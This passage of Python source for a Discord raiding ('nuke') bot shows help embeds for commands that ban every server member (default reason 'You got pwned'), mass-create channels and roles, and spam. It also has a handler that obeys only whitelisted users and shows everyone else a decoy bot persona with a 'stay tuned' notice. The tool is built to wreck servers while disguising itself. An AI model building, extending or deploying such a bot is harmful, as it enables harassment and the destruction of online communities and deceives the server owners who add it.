            title="Help for Mass Channel Creating - Unsafe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(masschannel_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mc [number_of_channels_to_create] [channel_name] `", inline=False)
        embed.add_field(name="Description", value="This command creates channels in the server upto the specified amount with the given name continuously, maximum number_of_channels_to_create is 100, default is 5", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in masschannel_safe_wl:
        embed = discord.Embed(
            title="Help for Mass Channel Creating - Safe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(masschannel_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mcs [number_of_channels_to_create] [channel_name] `", inline=False)
        embed.add_field(name="Description", value="This command creates channels in the server upto the specified amount with the given name with a time interval, maximum number_of_channels_to_create is 45, default is 5", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in massrole_unsafe_wl:
        embed = discord.Embed(
            title="Help for Mass Role Creating - Unsafe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(masschannel_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mr [number_of_roles_to_create] [role_name] `", inline=False)
        embed.add_field(name="Description", value="This command creates roles in the server upto the specified amount with the given name continuously, maximum number_of_roles_to_create is 150, default is 5", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in massrole_safe_wl:
        embed = discord.Embed(
            title="Help for Mass Role Creating - Safe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(masschannel_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mr [number_of_roles_to_create] [role_name] `", inline=False)
        embed.add_field(
            name="Description", value="This command creates roles in the server upto the specified amount with the given name with a time interval, maximum number_of_roles_to_create is 45, default is 5. Mentioning the [role_name] as 'random' will create roles with random names", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in massban_unsafe_wl:
        embed = discord.Embed(
            title="Help for Mass Ban - Unsafe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(massban_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mb [ban_reason]`", inline=False)
        embed.add_field(
            name="Description", value="This command banes everyone in the server continuously! giving the ban_reason is optional, by default it is 'You got pwned'", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in massban_safe_wl:
        embed = discord.Embed(title="Help for Mass Ban - Safe", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(massban_safe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}mbs [ban_reason]`", inline=False)
        embed.add_field(name="Description", value="This command banes everyone in the server with a time interval! giving the ban_reason is optional, by default it is 'You got pwned'", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    else:
        embed = discord.Embed(title="Help", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878847160177786940/img-help_button.png")
        embed.add_field(name="Command list:", value=f"**{bot_prefix}h** - Help\n**{bot_prefix}s** - Spam\n**{bot_prefix}ms** - Mass Spam\n**{bot_prefix}mc** - Mass Channel (Unsafe/Fast)\n**{bot_prefix}mcs** - Mass Channel Safe\n**{bot_prefix}mr** - Mass Role (Unsafe/Fast)\n**{bot_prefix}mrs** - Mass Role Safe\n**{bot_prefix}mb** - Mass Ban\n**{bot_prefix}mbs** - Mass Ban Safe", inline=False)
        embed.add_field(
            name="More Help:", value=f"Enter `{bot_prefix}h [command_name]` to see more + described help for each and every command!")
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)


# THE BOT WILL ONLY ACCEPT COMMANDS FROM able_users
# --------------------------
@client.event
async def on_message(message):
    if client.user == message.author:
        return

    if message.author.id in able_users:
        await client.process_commands(message)
    else:
        if str(message.content).lower().startswith(fake_bot_prefix):
            embed = discord.Embed(title=f"{message.author.name}! Please Stay Tuned!", colour=discord.Colour(
                0x00d9ff), timestamp=datetime.datetime.utcfromtimestamp(1629281713))
            embed.set_author(name=f"{fake_bot_name}",
                             icon_url=f"{fake_bot_author_icon}")
            embed.set_thumbnail(url=f"{fake_bot_author_icon}")
            embed.add_field(
                name="Notice!", value=f"```- {fake_bot_name} - {fake_bot_notice_message} - Made by {fake_bot_creator_name}```", inline=False)
            await message.channel.send(embed=embed)

# keep_alive()

# client.run(token)
